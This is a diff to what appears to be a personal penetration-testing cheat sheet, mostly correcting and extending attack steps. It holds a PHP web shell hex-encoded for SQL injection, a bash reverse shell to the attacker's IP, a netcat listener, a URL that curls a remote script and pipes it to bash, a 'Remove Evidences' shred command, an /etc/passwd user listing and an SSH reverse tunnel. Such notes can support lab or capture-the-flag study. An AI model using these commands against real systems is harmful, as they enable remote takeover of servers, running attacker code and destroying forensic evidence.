@@ -28,7 +28,7 @@ How to monitor for linux rootkits
 1. Make rkhunter database
 ```bash
 rkhunter --propupd 
-``
+```
 
 2. Launch rkhunter
 ```bash 
@@ -89,13 +89,13 @@ How to inject PHP code, in this case remote command execution into an sqlinjecti
 
 1. covert a string into hexadecimal and inject the code on the wesite
 ```bash
-echo '<?php echo "<pre> . shell_exec($_REQUEST["cmd"]). "</pre>";?>' | xxd -ps | tr -d "\n"
+echo '<?php echo "<pre>" . shell_exec($_REQUEST["cmd"]). "</pre>"; ?>' | xxd -ps | tr -d "\n"
 ```
 2. Create a reverse shell, reverseh.sh
 ```bash
 #!/bin/bash
 
-bash -i &  /dev/tcp/<ip>/443 0>&1
+bash -i >& /dev/tcp/<your-local-ip>/4443 0>&1
 ```
 
 3. Share a server with simpleHttpServer
@@ -103,9 +103,14 @@ bash -i &  /dev/tcp/<ip>/443 0>&1
 python -m SimpleHTTPServer 80
 ```
 
+4. Listen with netcat on your machine to the port 4443
+```bash
+nc -lvp 4443
+```
+
 4. Curl your reverse.sh into your remote execution injection (point 1) and pipe to bash
 ```bash 
-http://<remote-ip>/remote.php?cmd=curl <your-ip>/reverse.sh | bash 
+http://<remote-ip>/remote.php?cmd=curl <your-local-ip>/reverse.sh | bash 
 ```
 
 
@@ -138,10 +143,27 @@ reset
 # Consolidate your terminal
 xterm
 
+# To be able to make Control + C and Control + L
 export TERM=xterm
-
 export SHELL=bash
 
 # Get correct proporcion
-stty rows 52 columsn 197
+stty rows 52 columns 197
 ```
+
+# Remove Evidences
+```
+shred -zun -S -v{file.php, file2.xt}
+```
+
+# Grep users that exist at system lvel
+```bash
+cat /etc/passwd | grep "sh$"
+```
+
+# How to forwared a remote port to your local machine using ssh and dont login in your system
+Execute the following in the remote machine.
+```ssh
+ssh -R 3000:127.0.0.1:3000 <your-user>@<your-ip> -N -f
+```
+
